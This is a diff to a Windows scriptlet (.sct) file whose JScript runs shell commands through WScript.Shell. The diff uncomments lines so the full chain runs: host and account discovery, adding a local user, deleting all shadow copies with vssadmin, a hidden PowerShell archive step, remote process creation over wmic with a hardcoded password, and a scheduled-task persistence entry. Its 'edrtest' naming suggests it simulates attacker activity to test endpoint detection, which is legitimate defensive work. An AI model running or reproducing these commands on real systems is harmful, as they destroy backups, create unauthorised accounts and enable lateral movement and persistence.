@@ -5,17 +5,17 @@
     classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
 	<script language="JScript">
 		<![CDATA[
-//var r = new ActiveXObject("WScript.Shell").Run("cmd /c mkdir c:\\edrtest");
+var r = new ActiveXObject("WScript.Shell").Run("cmd /c mkdir c:\\edrtest");
 var r = new ActiveXObject("WScript.Shell").Run("ipconfig /all");
 var r = new ActiveXObject("WScript.Shell").Run("arp -a");
 var r = new ActiveXObject("WScript.Shell").Run("ping misdepatrment.com -i 1");
-//var r = new ActiveXObject("WScript.Shell").Run("wmic useraccount get /ALL");
+var r = new ActiveXObject("WScript.Shell").Run("wmic useraccount get /ALL");
 var r = new ActiveXObject("WScript.Shell").Run("net user /add sh123");
 var r = new ActiveXObject("WScript.Shell").Run("cmd /c vssadmin.exe Delete Shadows /All /Quiet");
 var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -NoP -sta -NonI -W Hidden Compress-Archive -Path c:\\temp\\*.txt -Destination c:\\temp\\test.zip");
 var r = new ActiveXObject("WScript.Shell").Run("wmic /node:172.17.0.26 /user:11100 /password:Crowdstrike2017! process call create notepad");
-//var r = new ActiveXObject("WScript.Shell").Run("cmd /c systeminfo > c:\\edrtest\\systeminfo.txt");
-//var r = new ActiveXObject("WScript.Shell").Run("cmd /c schtasks /create /tn edrtesttask1 /tr c:\\edrtest\\edrtest.bat /sc minute");
+var r = new ActiveXObject("WScript.Shell").Run("cmd /c systeminfo > c:\\edrtest\\systeminfo.txt");
+var r = new ActiveXObject("WScript.Shell").Run("cmd /c schtasks /create /tn edrtesttask1 /tr c:\\edrtest\\edrtest.bat /sc minute");
 ]]>
 </script>
 </registration>
